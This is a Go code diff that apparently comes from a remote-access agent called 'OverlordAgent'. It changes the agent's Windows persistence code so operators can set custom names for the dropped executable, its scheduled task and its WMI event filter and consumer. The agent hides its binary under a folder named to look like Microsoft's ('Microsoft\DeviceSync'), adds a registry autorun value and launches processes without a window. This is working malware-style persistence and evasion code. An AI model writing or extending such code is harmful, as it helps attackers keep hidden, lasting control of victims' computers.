@@ -25,14 +25,24 @@ const (
 
 	appDataBinaryDir = `Microsoft\DeviceSync`
 
-	startupExecutablePrefix = "ovd_"
-	taskNamePrefix          = "ovd_"
+	defaultExecutablePrefix = "ovd_"
 
 	legacyRegistryValueName = "OverlordAgent"
 	registryValuePrefix     = "OverlordAgent-"
 
 	createNoWindow = 0x08000000
 )
+
+func hasCustomName() bool {
+	return DefaultStartupName != ""
+}
+
+func executablePrefix() string {
+	if hasCustomName() {
+		return DefaultStartupName
+	}
+	return defaultExecutablePrefix
+}
 
 func activeMethod() string {
 	m := strings.ToLower(strings.TrimSpace(DefaultPersistenceMethod))
@@ -103,7 +113,11 @@ func findExistingBinaryInDir(dir string) (string, bool) {
 			continue
 		}
 		name := strings.ToLower(entry.Name())
-		if strings.HasSuffix(name, ".exe") && strings.HasPrefix(name, startupExecutablePrefix) {
+		if hasCustomName() {
+			if name == strings.ToLower(DefaultStartupName+".exe") {
+				return filepath.Join(dir, entry.Name()), true
+			}
+		} else if strings.HasSuffix(name, ".exe") && strings.HasPrefix(name, defaultExecutablePrefix) {
 			return filepath.Join(dir, entry.Name()), true
 		}
 	}
@@ -115,11 +129,14 @@ func findExistingStartupExecutable(startupDir string) (string, bool) {
 }
 
 func generateBinaryName() (string, error) {
+	if hasCustomName() {
+		return DefaultStartupName + ".exe", nil
+	}
 	b := make([]byte, 6)
 	if _, err := rand.Read(b); err != nil {
 		return "", fmt.Errorf("failed to generate executable name: %w", err)
 	}
-	return startupExecutablePrefix + hex.EncodeToString(b) + ".exe", nil
+	return defaultExecutablePrefix + hex.EncodeToString(b) + ".exe", nil
 }
 
 func generateStartupExecutableName() (string, error) {
@@ -127,14 +144,22 @@ func generateStartupExecutableName() (string, error) {
 }
 
 func deriveTaskName(targetPath string) string {
+	prefix := defaultExecutablePrefix
+	if hasCustomName() {
+		prefix = DefaultStartupName + "_"
+	}
 	h := sha256.Sum256([]byte(strings.ToLower(filepath.Clean(targetPath))))
-	return taskNamePrefix + hex.EncodeToString(h[:4])
+	return prefix + hex.EncodeToString(h[:4])
 }
 
 func deriveWMINames(targetPath string) (filterName, consumerName string) {
+	prefix := defaultExecutablePrefix
+	if hasCustomName() {
+		prefix = DefaultStartupName + "_"
+	}
 	h := sha256.Sum256([]byte(strings.ToLower(filepath.Clean(targetPath))))
 	suffix := hex.EncodeToString(h[:4])
-	return taskNamePrefix + "f" + suffix, taskNamePrefix + "c" + suffix
+	return prefix + "f" + suffix, prefix + "c" + suffix
 }
 
 func runPowerShell(script string) error {
@@ -273,7 +298,13 @@ func cleanupPrefixedExecutables(dir string) error {
 			continue
 		}
 		name := strings.ToLower(entry.Name())
-		if strings.HasPrefix(name, startupExecutablePrefix) {
+		var match bool
+		if hasCustomName() {
+			match = name == strings.ToLower(DefaultStartupName+".exe")
+		} else {
+			match = strings.HasPrefix(name, defaultExecutablePrefix)
+		}
+		if match {
 			if err := os.Remove(filepath.Join(dir, entry.Name())); err != nil && !os.IsNotExist(err) {
 				return fmt.Errorf("failed to remove startup artifact %s: %w", filepath.Join(dir, entry.Name()), err)
 			}
